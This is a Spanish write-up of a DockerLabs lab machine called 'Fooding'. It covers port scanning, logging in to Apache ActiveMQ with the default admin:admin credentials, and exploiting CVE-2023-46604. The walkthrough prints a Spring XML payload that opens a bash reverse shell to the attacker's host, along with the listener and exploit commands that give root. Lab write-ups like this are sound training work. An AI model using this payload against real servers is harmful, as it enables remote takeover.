@@ -1,0 +1,186 @@
+---
+title: Fooding
+description: Resolución completa de la máquina virtual *Fooding* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Fooding**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone múltiples servicios, incluyendo Apache ActiveMQ en el puerto 8161 con credenciales por defecto (`admin:admin`). Esta exposición permite acceder al panel de administración, donde se identifica la versión `5.15.15`, vulnerable a **CVE-2023-46604**. Mediante un PoC disponible, se explota la vulnerabilidad para obtener una reverse shell directamente como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Fooding',
+    Autor: 'd1se0',
+    Dificultad: 'Media',
+    Fecha: '15/06/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Fooding.zip
+sudo bash auto_deploy.sh Fooding.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Fooding/{content,exploits,nmap,scripts}
+cd Fooding
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+* **443/tcp** — HTTPS
+* **1883/tcp** — MQTT
+* **5672/tcp** — AMQP
+* **8161/tcp** — HTTP (Apache ActiveMQ)
+* **33743/tcp** — tcpwrapped
+* **61613/tcp** — STOMP
+* **61614/tcp** — HTTP
+* **61616/tcp** — ApacheMQ
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1782883082/Ports_impzhf.png)
+
+Se realiza un escaneo detallado de los servicios:
+
+```bash
+nmap -sCV -p 80,443,1883,5672,8161,33743,61613,61614,61616 -n -Pn 172.17.0.2
+```
+
+---
+
+### 1.2 Enumeración web
+
+Se realiza fuzzing sobre los servicios web, encontrando un panel de autenticación en el puerto `8161` correspondiente a Apache ActiveMQ.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Credenciales por defecto
+
+Se prueban credenciales por defecto `admin:admin`, obteniendo acceso al panel de administración:
+
+![ApacheMQ](https://res.cloudinary.com/dewqswzke/image/upload/v1782883082/ApacheMq_rlgy6z.png)
+
+Se accede al dashboard:
+
+![Admin Dashboard](https://res.cloudinary.com/dewqswzke/image/upload/v1782883081/ApacheAdmin_hyacya.png)
+
+Se identifica la versión `5.15.15`.
+
+### 2.2 Explotación de CVE-2023-46604
+
+Se busca un PoC para la vulnerabilidad:
+
+```bash
+git clone https://github.com/rootsecdev/CVE-2023-46604
+```
+
+Se adapta el payload `poc-linux.xml`:
+
+```xml
+<beans xmlns="http://www.springframework.org/schema/beans"
+   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+   xsi:schemaLocation="
+ http://www.springframework.org/schema/beans http://www.springframework.org/schema/bean>
+    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+        <constructor-arg>
+        <list>
+            <value>bash</value>
+            <value>-c</value>
+            <value>bash -i &#x3E;&#x26; /dev/tcp/172.17.0.1/443 0&#x3E;&#x26;1</value>
+        </list>
+        </constructor-arg>
+    </bean>
+</beans>
+```
+
+Se inicia un servidor HTTP:
+
+```bash
+python3 -m http.server 80
+```
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se ejecuta el exploit:
+
+```bash
+go run main.go -i 172.17.0.2 -p 61616 -u http://172.17.0.1/poc-linux.xml
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1782883082/Root_lrftdr.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+No es necesaria la escalada de privilegios, ya que se ha obtenido acceso directamente como `root`.
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Credenciales por defecto en Apache ActiveMQ",
+      severity: "Crítica",
+      impact: "Acceso al panel de administración"
+    },
+    {
+      vulnerability: "Apache ActiveMQ vulnerable a CVE-2023-46604",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como root"
+    },
+    {
+      vulnerability: "Exposición de versión del software",
+      severity: "Media",
+      impact: "Explotación dirigida"
+    }
+  ]}
+/>
